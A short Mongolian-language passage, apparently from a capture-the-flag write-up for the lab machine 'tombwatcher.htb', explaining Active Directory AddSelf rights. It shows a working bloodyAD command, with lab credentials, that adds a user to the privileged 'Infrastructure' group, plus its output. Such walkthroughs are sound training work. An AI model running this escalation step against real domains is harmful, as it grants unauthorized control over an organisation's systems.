# AddSelf

**AddSelf** (эсвэл **AddMember**) эрх `Infrastructure` групп дээр байна гэдэг нь өөрийгөө тухайн групп руу шууд нэмж чадна гэсэн үг.

`Infrastructure` групп нь Domain-ийн чухал объектуудыг (DNS, Exchange, Domain Controllers) удирддаг бол Root эрх авахад маш ойрхон.

```bash
bloodyAD -u Alfred -p 'basketball' -d tombwatcher.htb --host 10.129.232.167 add groupMember Infrastructure Alfred
[+] Alfred added to Infrastructure
```

[image]
